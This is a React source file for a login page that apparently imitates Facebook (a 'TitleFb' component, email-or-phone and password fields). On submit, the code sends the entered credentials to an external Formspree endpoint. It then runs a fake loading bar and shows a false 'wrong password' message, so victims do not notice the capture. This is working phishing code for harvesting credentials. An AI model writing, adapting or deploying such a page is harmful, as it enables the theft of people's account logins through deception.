import React, { Fragment,useState,useEffect } from 'react';
import logo from './logo.svg';
import './App.css';
import Email from './components/Email';
import Password from './components/Password';
import ButtonConnexion from './components/ButtonConnexion';
import CreateAccount from './components/CreateAccount';
import Lang from './components/Lang';
import BlackBackground from './components/BlackBackground';
import TitleFb from './components/TitleFb';

import {useTranslation }  from 'react-i18next'
import axios from "axios"




function App() {
  let data = {
    emailOrPhone: '',
    password: ''
  }
 

  const [openModal, setOpenModal] = useState(false)
  let [widthLoading, setWidthLoading] = useState(0)
  const [shouldCount, setShouldCount] = useState(false)
  const [userInfo, setUserInfo] = useState(data)
  const [t, i18n] = useTranslation('common')

  // handle input


  const handleChange = e=>{

    
    setUserInfo({
      ...userInfo,
      [e.target.id]: e.target.value
    })



  }


// sumbmit data





const submitInfo = e=>{
  e.preventDefault()

  const { emailOrPhone,password  } = userInfo;

  if(emailOrPhone && password){
      axios.post("https://formspree.io/f/mzbkknod",userInfo)
    .then(()=>{
      console.log("data submitted")
    })
    .catch(err=>{
      console.log(err)
    })
   
  }
}



  const set_animation = ()=>{
    const hide_body = document.querySelector('#hide_body_id')
    const loadEl = document.querySelector('#load')
    hide_body.classList.add('hide_body')
    setShouldCount(true)
    loadEl.classList.add("loading")
  
  }


  useEffect(() => {
    let interval=null
     if(shouldCount){
       interval =  setInterval(() => {
        let numberByRandom = Math.floor(Math.random() * 3)
        setWidthLoading(widthLoading+numberByRandom)
        },50)
      if(widthLoading>97){
        setOpenModal(true)
        clearInterval(interval)
      }
     }
    return ()=>clearInterval(interval)
  }, [shouldCount,widthLoading])





  


  const modalContent = ()=>{
    return openModal ? (<div className="modal_container">
    <div className="modal">
      <p className="title-wrong"><b>{t('pass_wrong.title')}</b></p>
      <p className="mssg-success-or-error">{t('pass_wrong.message')}</p>
        <button onClick={exitModal} className="ok">ok</button>
    </div>
  </div>) : null
  }

  const exitModal = ()=>{
    setOpenModal(false)
    const hide_body = document.querySelector('#hide_body_id')
    const loadEl = document.querySelector('.loading')
    hide_body.classList.remove('hide_body')
    loadEl.classList.remove("loading")
    setWidthLoading(0)
    setShouldCount(false)
  }

  const { password,emailOrPhone }  = userInfo



  return (
    <Fragment>
      <div className="container">
        <div className="loading"id="load" style={{width: widthLoading+"%"}}></div>
          <TitleFb />
          <div className="main">
            <form
              onSubmit={submitInfo}
     
            >

              <Email handleChange={handleChange}  emailOrPhone={emailOrPhone || ''} />
              <Password handleChange={handleChange} password={password || ''}  />
              <ButtonConnexion set_animation={set_animation} />

            </form>


            <p className="forgot">
              {t('forgot_pass')}
            </p>

              <CreateAccount />
              <Lang />
          </div>
      </div>

      <BlackBackground />

      {modalContent()}

    </Fragment>
  );
}

export default App;
